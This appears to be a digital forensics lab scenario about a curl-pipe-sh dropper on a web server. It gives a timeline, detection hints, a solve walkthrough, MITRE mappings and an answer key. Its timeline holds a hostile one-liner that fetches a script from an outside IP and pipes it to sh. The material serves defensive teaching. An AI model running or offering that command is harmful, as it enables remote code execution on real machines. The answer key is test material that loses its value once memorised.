# curl-pipe-sh-dropper

## Scenario
A one liner downloads and runs an attacker script (curl pipe sh), dropping a payload into /tmp.

## Timeline
```
~10:45  curl http://45.137.22.90/i.sh | sh drops and runs /tmp/.x
```

## How to spot it
- curl or wget piped straight to sh/bash
- Download from an attacker IP
- A hidden executable dropped in /tmp
- Run immediately after

## Questions
```
1. Technique?          curl | sh dropper
2. Source?             45.137.22.90/i.sh
3. Dropped?            /tmp/.x
4. User?               www-data
5. Host?               websrv01
```

## How to solve it

1. Extract the evidence, password `hidden`: `7z x 754c8b9f33011c808e0df00f0e853a83fb405a1d1acfecf02c4ef6231f12d4a7.zip -phidden` (or your archive tool). You get `auth.log`.
2. Read the log: `less auth.log`; for auditd use `ausearch -if auth.log`, for a journal export `journalctl --file=auth.log`.
3. Grep the indicator: `grep -Ei 'failed|accepted|sudo|useradd|/tmp/|preload|cron|wget|curl' auth.log` (narrow to this attack).
4. Confirm against the answer: curl or wget piped straight to sh/bash

## MITRE ATT&CK
- T1059.004 Unix Shell
- T1105 Ingress Tool Transfer

## Tools
Hand written Linux logs with a workday of normal activity as background

## Signature
Forensic Sample Blueprint | qayssarayra.com
